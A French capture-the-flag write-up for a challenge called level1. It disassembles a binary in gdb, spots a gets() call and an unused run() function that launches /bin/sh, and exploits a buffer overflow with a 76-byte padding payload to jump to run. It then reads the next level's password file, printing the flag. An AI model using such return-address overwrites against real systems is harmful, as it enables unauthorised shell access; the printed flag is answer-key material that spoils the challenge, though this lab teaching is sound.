#level1

On a un exécutable qui s'appelle level1.

Il attend un input et ensuite s'arretera.

Regardons un peu plus en détail.

$ gdb level1

> disas level1

Dump of assembler code for function main:
0x08048480 <+0>: push %ebp
0x08048481 <+1>: mov %esp,%ebp
0x08048483 <+3>: and $0xfffffff0,%esp
0x08048486 <+6>: sub $0x50,%esp
0x08048489 <+9>: lea 0x10(%esp),%eax
0x0804848d <+13>: mov %eax,(%esp)
0x08048490 <+16>: call 0x8048340 <gets@plt>
0x08048495 <+21>: leave
0x08048496 <+22>: ret
End of assembler dump.

On voit qu'il appelle gets() puis qu'il s'arrête.

En regardant la liste des fonctions, on remarque qu'il y a une fonction qui s'appelle run mais qui n'est pas appelée.

(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8 \_init
0x08048340 gets
0x08048340 gets@plt
0x08048350 fwrite
0x08048350 fwrite@plt
0x08048360 system
0x08048360 system@plt
0x08048370 **gmon_start**
0x08048370 **gmon_start**@plt
0x08048380 **libc_start_main
0x08048380 **libc_start_main@plt
0x08048390 \_start
0x080483c0 **do_global_dtors_aux
0x08048420 frame_dummy
0x08048444 run
0x08048480 main
0x080484a0 **libc_csu_init
0x08048510 **libc_csu_fini
0x08048512 **i686.get_pc_thunk.bx
0x08048520 \_\_do_global_ctors_aux
0x0804854c \_fini

On desassembre la fonction run:

> disas run
> Dump of assembler code for function run:
> 0x08048444 <+0>: push %ebp
> 0x08048445 <+1>: mov %esp,%ebp
> 0x08048447 <+3>: sub $0x18,%esp
> 0x0804844a <+6>: mov 0x80497c0,%eax
> 0x0804844f <+11>: mov %eax,%edx
> 0x08048451 <+13>: mov $0x8048570,%eax
> 0x08048456 <+18>: mov %edx,0xc(%esp)
> 0x0804845a <+22>: movl $0x13,0x8(%esp)
> 0x08048462 <+30>: movl $0x1,0x4(%esp)
> 0x0804846a <+38>: mov %eax,(%esp)
> 0x0804846d <+41>: call 0x8048350 <fwrite@plt>
> 0x08048472 <+46>: movl $0x8048584,(%esp)
> 0x08048479 <+53>: call 0x8048360 <system@plt>
> 0x0804847e <+58>: leave
> 0x0804847f <+59>: ret
> End of assembler dump.

On voit un appel à system().

Regardons l'argument de la fonction system().

> x/s 0x8048584
> 0x8048584: "/bin/sh"

On va essayer de lancer run pour utiliser system().

On remarque après plusieurs tests que le programme segfaulte à partir de plus de 76 charactères.

$ python -c "print 'A'\*80" | ./level1
Segmentation fault (core dumped)

On va donc exploiter level1 avec un buffer overflow et ainsi rediriger le programme vers la fonction run.

$ python -c "print 'A'\*76 + '\x44\x84\x04\x08'" > /tmp/payload1

$ cat /tmp/payload1 - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
